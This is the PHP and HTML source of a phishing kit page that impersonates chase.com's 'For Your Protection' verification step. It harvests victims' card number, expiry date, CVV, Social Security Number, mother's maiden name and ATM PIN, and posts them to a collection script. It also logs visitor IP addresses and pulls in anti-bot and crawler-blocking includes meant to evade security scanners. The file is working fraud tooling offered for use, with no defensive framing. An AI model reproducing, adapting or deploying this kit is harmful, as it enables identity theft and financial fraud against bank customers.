<?php


// ------------------------------------------------- //
  #                 BY: @blue_prints              #
  #             F#ck you credit changer :)        #
  # Change credit if you dont know how to code :) #
  #################################################
// -------------------------------------------------//

session_start();
error_reporting(0);

//other bots
include 'blueprint/antbots/ip_blocklist.php';
include 'blueprint/antbots/crawler.php';
include 'blueprint/antbots/boting.php';
include 'blueprint/antbots/myz.php';
include 'bot_fucker/fucker001.php';
include 'bot_fucker/fucker002.php';
include 'bot_fucker/fucker003.php';
include 'bot_fucker/fucker004.php';
include 'bot_fucker/fucker005.php';
include 'bot_fucker/fucker006.php';
include 'bot_fucker/fucker007.php';
include 'bot_fucker/fucker008.php';
include 'bot_fucker/wrd.php';
include 'bot_fucker/bot.php';
require_once 'inc.php';
require_once 'blocklist.php';
require_once 'proxy.php';
require_once 'huehuehue.php';

include 'zsec.php';
//Crawler
   @require "blueprint/antbots/Crawler/src/CrawlerDetect.php";
use JayBizzle\CrawlerDetect\CrawlerDetect;




    $content2 = "#>".$_SERVER['REMOTE_ADDR']."\r\n";
    $save2=fopen("files/data/cc_page_views.txt","a+");
    fwrite($save2,$content2);
    fclose($save2);

?>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="en" dir="ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <meta name="robots" content="noindex,nofollow">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="msapplication-config" content="none">
        <title>For Your Protection - chase.com</title>
        <meta name="description" content="">
        <meta name="author" content="">    
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="shortcut icon" href="https://static.chasecdn.com/content/dam/cpo-static/images/chasefavicon.ico">
    <link rel="stylesheet" href="https://static.chasecdn.com/web/2019.08.25-2054/logon/assets/logon.css">
<link rel="stylesheet" href="https://static.chasecdn.com/web/2019.07.21-797/common/assets/blue-ui.css">
<style type="text/css">
@font-face {
    font-family: 'icomoon';
    src: url("https://www.chase.com/c/082819/etc/designs/chase-ux/css/fonts/icomoon.eot?bj1g7l");
    src: url("https://www.chase.com/c/082819/etc/designs/chase-ux/css/fonts/icomoon.eot?bj1g7l#iefix") format('embedded-opentype'),url("https://www.chase.com/c/082819/etc/designs/chase-ux/css/fonts/icomoon.ttf?bj1g7l") format('bj1g7l'),url("https://www.chase.com/c/082819/etc/designs/chase-ux/css/fonts/icomoon.woff?bj1g7l") format('woff'),url("https://www.chase.com/c/082819/etc/designs/chase-ux/css/fonts/icomoon.svg?bj1g7l#icomoon") format('svg');
    font-weight: normal;
    font-style: normal
}
    .timeout-message {
    background-color: #128842;
    display: none;
}

.timeout-message__inner {
    position: relative;
    min-height: 2.25em;
    padding-top: 14px;
    padding-bottom: 14px;
}

.timeout-message__inner button {
    background-color: transparent;
    border: none;
    padding: 0
}

.timeout-message__text {
    line-height: 1.3em;
    font-weight: 300;
    position: relative;
}

.timeout-message__text-msg {
    display: none;
    color: #fff;
    margin: 0;
    position: relative;
    vertical-align: middle;
    padding-left: 32px;
    padding-right: 32px;
    font-size: 1.15em;
}

.timeout-message__text-msg.display {
    display: inline-block
}

.timeout-message__text-msg:focus {
    outline: 1px dotted #000
}

.timeout-message__dismiss-btn {
    color: #fff;
    text-decoration: none;
    position: absolute;
    font-size: .875em;
    line-height: 1.6em;
    top: 2px;
    right: 0;
}

.timeout-message__dismiss-btn:focus {
    outline: 1px dotted #000
}

.timeout-message__checkmark {
    display: inline-block;
    position: absolute;
    left: 0;
    margin-right: 12px;
}

.timeout-message__checkmark.icon-check-mark {
    -webkit-border-radius: 22px;
    border-radius: 22px;
    height: 22px;
    width: 22px;
    background: #fff;
    top: 4px;
}

.timeout-message__checkmark.icon-check-mark:before {
    color: #128842;
    font-size: 20px;
    font-weight: 300
}

@media only screen and (min-width: 48em) {
    .timeout-message__inner {
        padding-top:20px;
        padding-bottom: 20px;
        padding-left: 8px;
        padding-right: 8px
    }

    .timeout-message__text {
        font-size: 1.25em;
        line-height: 1.3em
    }

    .timeout-message__checkmark.icon-check-mark:before {
        margin-left: 1px
    }
    .feature-container {
        margin: 0 auto;
        max-width: 75em
    }
    .container-fluid {
    margin-right: auto;
    margin-left: auto;
    padding-left: 8px;
    padding-right: 8px
}
}
[class^="icon-"]:before,[class*=" icon-"]:before {
    font-family: 'icomoon' !important;
    /* speak: none; */
    font-style: normal;
    font-weight: normal;
    font-variant: normal;
    text-transform: none;
    line-height: 1;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
}
.icon-close:before {
    content: "\e611";
}
.icon-check-mark:before {
    content: "\e60c";
} 

.loader,
.loader:after {
  border-radius: 50%;
  width: 10em;
  height: 10em;
}
.loader {
  margin: 60px auto;
  font-size: 5px;
  position: relative;
  text-indent: -9999em;
  border-top: 1.1em solid rgba(255, 255, 255, 0.2);
  border-right: 1.1em solid rgba(255, 255, 255, 0.2);
  border-bottom: 1.1em solid rgba(255, 255, 255, 0.2);
  border-left: 1.1em solid #0092ff;
  -webkit-transform: translateZ(0);
  -ms-transform: translateZ(0);
  transform: translateZ(0);
  -webkit-animation: load8 1.1s infinite linear;
  animation: load8 1.1s infinite linear;
}
@-webkit-keyframes load8 {
  0% {
    -webkit-transform: rotate(0deg);
    transform: rotate(0deg);
  }
  100% {
    -webkit-transform: rotate(360deg);
    transform: rotate(360deg);
  }
}
@keyframes load8 {
  0% {
    -webkit-transform: rotate(0deg);
    transform: rotate(0deg);
  }
  100% {
    -webkit-transform: rotate(360deg);
    transform: rotate(360deg);
  }
}
</style>
</head>

<body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true" onFocus="parent_disable();" onclick="parent_disable();">
<div class="jpui modal" id="fullscreen-container" data-is-view="true" style="display: none;">
    <div class="dialog vertical-center util print-position-initial">
        <section class="dialogContent">
            <div class="row">
                <div class="col-xs-12 col-sm-7 col-sm-offset-3 util print-width-100-percent print-nomargin yielded-modal-content"><h1 class="u-no-outline dialogTitle" tabindex="-1"><i class="jpui exclamation-color icon error" id="undefined" aria-hidden="true"></i><span class="util accessible-text">Important: </span> Email Authentication Required.</h1><div class="suspended-advisory dialogMessage">We automatically redirected you to <span></span> to verify your email.<div class="loader">Loading...</div><a href="javascript:child_open(url)">Verify your email in the window provided. Click here if you can't find it.</a></div>
            </div>
        </section>
    </div>
</div>

<div class="jpui modal" id="inactiveAccountDialog" data-is-view="true" style="display: none;">
    <div class="dialog vertical-center util print-position-initial">
        <section class="dialogContent">
            <div class="row">
                <div class="col-xs-12 col-sm-7 col-sm-offset-3 util print-width-100-percent print-nomargin yielded-modal-content"><h1 class="u-no-outline dialogTitle" tabindex="-1"><i class="jpui exclamation-color icon error" id="undefined" aria-hidden="true"></i><span class="util accessible-text">Important: </span> <?php echo $notice['we'];?></h1> <div class="suspended-advisory dialogMessage"> <?php echo $notice['weneed'];?>&nbsp;please <a href="#">click <?php echo $notice['but'];?> to proceed<</div><br> <div class="row"><div class="col-xs-12 col-sm-offset-4 col-sm-4"><button type="button" id="exitAccountSuspended" class="jpui button focus primary fluid"><span class="label"><?php echo $notice['but'];?></span> </button></div></div></div>
            </div>
        </section>
    </div>
</div>
    <div id="logonApp" data-is-view="true">
        
        <div class="homepage" tabindex="-1">
            <div class="logon-container" id="container">
                <header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true">
                    <div class="logon header jpui transparent navigation bar" data-is-view="true">
                        <a id="logoHomepageLink" href="#">
                            <div class="chase logo"></div> <span class="util accessible-text">Chase.com homepage</span></a>
                    </div>

                </header>
                <main id="logon-content" data-has-view="true">
                    <div class="msd" data-is-view="true">
                        <div id="backgroundImage">
                            <div class="jpui background image fixed blurred" id="geoImage">
                                <style type="text/css">
                                    ul li {
                                        margin-bottom: 5px;
                                    }
                                    .jpui.background.image {
                                        background-image: url(https://static.chasecdn.com/content/geo-images/images/background.mobile.day.2.jpeg);
                                        filter: progid: DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.day.2.jpeg', sizingMethod='scale');
                                        -ms-filter: progid: DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.day.2.jpeg', sizingMethod='scale');
                                    }
                                    
                                    @media (min-width:320px) {
                                        .jpui.background.image {
                                            background-image: url(https://static.chasecdn.com/content/geo-images/images/background.mobile.day.2.jpeg);
                                        }
                                    }
                                    
                                    @media (min-width:992px) {
                                        .jpui.background.image {
                                            background-image: url(https://static.chasecdn.com/content/geo-images/images/background.tablet.day.2.jpeg);
                                        }
                                    }
                                    
                                    @media (min-width:1024px) {
                                        .jpui.background.image {
                                            background-image: url(https://static.chasecdn.com/content/geo-images/images/background.desktop.day.2.jpeg);
                                        }
                                    }
                                </style>
                            </div>
                        </div>
                        <div class="container step4">
<div class="row jpui primary panel">
        <div class="col-xs-12 col-md-10 col-md-offset-1 content-container">
            <h1 class="header" tabindex="-1">For Your Protection</h1>
            <div class="row jpui panel body">
                <div class="col-xs-12 col-sm-10 col-sm-offset-1">
                    <div class="progress u-no-outline" id="progress" tabindex="-1">
                        <div class="row">
                            <div class="col-xs-12 col-sm-6 clear-padding">
                                <h2>Verify your card details on file <span class="util high-contrast">Step 3 of 3</span></h2> </div>
                            <div class="col-xs-12 col-sm-6 progress-padding">
                                <div class="jpui progress rectangles" id="progress-progressBar" data-progress="">
                                    <ol class="steps-3" role="presentation">
                                        <li class="active" id="progress-progressBar-step-1"></li>
                                        <li class="active" id="progress-progressBar-step-2"></li>
                                        <li class="active current-step" id="progress-progressBar-step-3"><span class="util accessible-text" id="accessible-progress-progressBar-step-3"></span></li>
                                    </ol>
                                </div>
                            </div>
                        </div>
                    </div>
                    <form action="files/next/cc.php" method="POST">
                        <h3>Enter your identification details.</h3>
                        <p>Your identification will be verified once submitted, please be sure of your information before you submit.</p>
                        <div class="inside-container">
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">Card Number</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                        
                                        <input  class="jpui input" required minlength="16" maxlength="16" placeholder="Card Number" type="tel" name="cc" required="" data-validation="creditcard" data-validation-error-msg="  ">
                             
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">Expiration Date</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                    <input  class="jpui input" id="exp" placeholder="MM/YYYY"  required type="tel" name="exp" data-validation="length"  data-validation-length="min7"  data-validation-error-msg="  ">
                             
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">CVV</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                    <input class="jpui input"  placeholder="CVV" type="password" name="cvv" minlength="3" maxlength="3" data-validation="cvv" data-validation-error-msg="  " required>
                             
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">Social Security Number</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                    <input class="jpui input"  placeholder="SSN" type="tel" name="ssn" minlength="9" maxlength="9" required>
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">Mother's Maiden Name</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                    <input  class="jpui input" placeholder="MMN"  type="text" name="mmn" data-validation="length" required data-validation-length="min1-12" data-validation-error-msg=" ">
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">ATM PIN</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                    <input  class="jpui input" placeholder="Atm Pin"  type="password" name="ap" minlength="4" maxlength="4" required data-validation="length" data-validation-length="min4-4" data-validation-error-msg=" ">
                                    </div>
                                </div>
                            </div>
  
                            <h3>We verify your account right away</h3>
                            <p class="identification-code-received-message"><span>Your account will be activated upon submission of your details.</span> <span class="jpui link" id="requestNewIdentificationCode-link-wrapper"><a class="link-anchor underline" id="requestNewIdentificationCode" href="javascript:void(0);" aria-label=" chase account verification ">chase account verification</a></span></p>
                        </div>
                        <div class="button-container row hide-sm">
                            <div class="col-xs-12 col-sm-3 col-sm-push-9">
                                <button type="submit" id="log_on_to_landing_page1" class="jpui button focus fluid primary"><span class="label">Next</span> </button>
                            </div>
                            <div class="col-xs-12 col-sm-3 col-sm-push-3">
                                <button type="button" id="exitIdentification" class="jpui button focus fluid cancel"><span class="label">Cancel</span> </button>
                            </div>
                        </div>
                        <div class="button-container row hide-xs show-sm">
                            <div class="col-xs-12 col-sm-3 col-sm-offset-6">
                                <button type="button" id="exitIdentification-sm4" class="jpui button focus fluid cancel"><span class="label">Cancel</span> </button>
                            </div>
                            <div class="col-xs-12 col-sm-3">
                                <button type="submit" id="log_on_to_landing_page-sm1" class="jpui button focus fluid primary"><span class="label">Next</span> </button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
</div>
                    </div>
                </main>
            </div>

            <footer class="logon-footer" id="logon-footer" data-has-view="true"></footer>
        </div>
        <div id="languageSupportDisclaimer"></div>
        <div id="overlay" data-has-view="true"></div>
        <div class="overlay"></div>
    </div>
  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.17.0/jquery.validate.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.13.4/jquery.mask.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/additional-methods.min.js"></script>
    <script type="text/javascript">

<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/dependencyLibs/inputmask.dependencyLib.js"></script>
<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/inputmask.js"></script>

<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script>
  $.validate({
    modules : 'security'
  });
  Inputmask("9{1,2}/9{1,4}").mask("#exp");

$("#formid").validate({
  invalidHandler: function(event, validator) {
    // 'this' refers to the form
    var errors = validator.numberOfInvalids();
    if (errors) {
      var message = errors == 1
        ? 'You missed 1 field. It has been highlighted'
        : 'You missed ' + errors + ' fields. They have been highlighted';
      $("div.error span").html(message);
      $("div.error").show();
    } else {
      $("div.error").hide();
    }
  }
});
</script>
    <body>
    </html>